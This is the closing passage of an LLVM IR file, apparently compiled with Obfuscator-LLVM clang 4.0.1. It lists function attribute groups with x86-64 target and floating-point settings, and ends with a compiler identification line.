attributes #6 = { noinline noreturn nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noinline norecurse nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readonly }
attributes #10 = { nounwind }
attributes #11 = { nounwind readnone }
attributes #12 = { cold }
attributes #13 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
